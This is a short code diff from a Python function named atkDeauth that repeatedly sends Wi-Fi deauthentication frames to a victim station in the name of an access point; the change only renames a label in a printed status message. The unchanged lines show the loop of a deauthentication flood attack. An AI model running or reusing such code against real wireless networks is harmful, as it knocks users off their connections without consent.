@@ -13,7 +13,7 @@ def atkDeauth(vicAddr:str, bssAddr:str, loopMax=0):
     while(True):
         sendp(pktDeauth)
         loopCnt += 1
-        print('Deauthentication Frame Sent ('+str(loopCnt) +'). (AP='+bssAddr + ' -> CLI='+vicAddr+')')
+        print('Deauthentication Frame Sent ('+str(loopCnt) +'). (AP='+bssAddr + ' -> STN='+vicAddr+')')
         if loopMax != 0:
             if loopCnt >= loopMax:
                 break
